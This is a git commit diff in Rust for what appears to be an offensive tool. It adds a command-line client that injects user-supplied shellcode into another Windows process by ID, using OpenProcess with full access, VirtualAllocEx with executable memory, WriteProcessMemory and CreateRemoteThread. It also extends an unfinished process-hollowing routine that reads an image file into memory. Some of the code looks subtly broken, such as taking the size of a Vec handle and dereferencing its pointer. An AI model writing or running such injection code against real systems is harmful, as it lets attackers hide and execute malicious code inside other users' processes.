8481af25b82f85530c78a01e12a5437eeba103a5
Mason <109301662+CodedMasonry@users.noreply.github.com>
2023-08-20 22:04:11 -0400

    Update windows process hollowing

--- client/src/main.rs
+++ client/src/main.rs
@@ -1,3 +1,20 @@
+use clap::Parser;
+use rootrm::migration;
+
+#[derive(Parser, Debug)]
+#[command(author, version, about, long_about = None)]
+struct Args {
+    #[arg(short, long)]
+    process: u32,
+
+    #[arg(short, long)]
+    shell_code: String,
+}
+
 fn main() {
-    println!("Hello, world!");
+    let args = Args::parse();
+
+    // Only returns errors; Succeeds with empty return
+    let _result = migration::process_injection(args.process, args.shell_code.as_bytes().to_vec())
+        .expect("Failed to Inject Code");
 }
--- client/src/migration.rs
+++ client/src/migration.rs
@@ -1,3 +1,4 @@
+use std::mem::size_of_val;
 use std::ptr;
 
 #[cfg(target_os = "windows")]
@@ -6,8 +7,9 @@ use windows::Win32::System::Memory;
 use windows::Win32::System::Threading;
 
 #[cfg(target_os = "windows")]
-pub fn process_injection(pid: u32, shellcode: [u8; 255]) -> Result<(), Box<dyn std::error::Error>> {
+pub fn process_injection(pid: u32, shell_code: Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
     // Initializes a process
+    let shell_code_size = size_of_val(&shell_code);
     let process_handle =
         unsafe { Threading::OpenProcess(Threading::PROCESS_ALL_ACCESS, false, pid) }?;
 
@@ -16,7 +18,7 @@ pub fn process_injection(pid: u32, shellcode: [u8; 255]) -> Result<(), Box<dyn s
         Memory::VirtualAllocEx(
             process_handle,
             None,
-            shellcode.len(),
+            shell_code_size,
             Memory::MEM_RESERVE | Memory::MEM_COMMIT,
             Memory::PAGE_EXECUTE_READWRITE,
         )
@@ -27,12 +29,13 @@ pub fn process_injection(pid: u32, shellcode: [u8; 255]) -> Result<(), Box<dyn s
         Debug::WriteProcessMemory(
             process_handle,
             remote_buffer,
-            shellcode.as_ptr() as *const std::ffi::c_void,
-            shellcode.len(),
+            *shell_code.as_ptr() as *const std::ffi::c_void,
+            shell_code_size,
             None,
         )
     }?;
 
+    // Execute Code
     let _remote_thread = unsafe {
         Threading::CreateRemoteThread(
             process_handle,
@@ -52,10 +55,19 @@ pub fn process_injection(pid: u32, shellcode: [u8; 255]) -> Result<(), Box<dyn s
 pub fn process_injection(pid: &str) {}
 
 #[cfg(target_os = "windows")]
-pub fn process_hollowing(_shellcode: [u8; 255]) -> Result<(), Box<dyn std::error::Error>> {
+pub fn process_hollowing(file: &str) -> Result<(), Box<dyn std::error::Error>> {
     use windows::{
         core::{PCSTR, PSTR},
-        Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOA},
+        Win32::{
+            Foundation::HANDLE,
+            Storage::FileSystem::{
+                self, GetFileSize, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ, OPEN_EXISTING, ReadFile,
+            },
+            System::{
+                Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
+                Threading::{PROCESS_INFORMATION, STARTUPINFOA},
+            },
+        },
     };
 
     unsafe {
@@ -73,8 +85,24 @@ pub fn process_hollowing(_shellcode: [u8; 255]) -> Result<(), Box<dyn std::error
             PCSTR(ptr::null_mut()),
             &target_si as *const STARTUPINFOA,
             &mut target_pi as *mut PROCESS_INFORMATION,
-        )
-    }?;
+        )?;
+
+        let image_file = FileSystem::CreateFileA(
+            PCSTR(file.as_ptr()),
+            2147483648,
+            FILE_SHARE_READ,
+            None,
+            OPEN_EXISTING,
+            FILE_FLAGS_AND_ATTRIBUTES(0),
+            HANDLE(0),
+        )?;
+
+        let file_size: usize = GetFileSize(image_file, None).try_into().unwrap();
+        let image = VirtualAlloc(None, file_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        let mut number_of_bytes_read = 0;
+
+        ReadFile(image_file, image, &mut number_of_bytes_read, None)
+    };
 
     // Successfully completed operation
     Ok(())
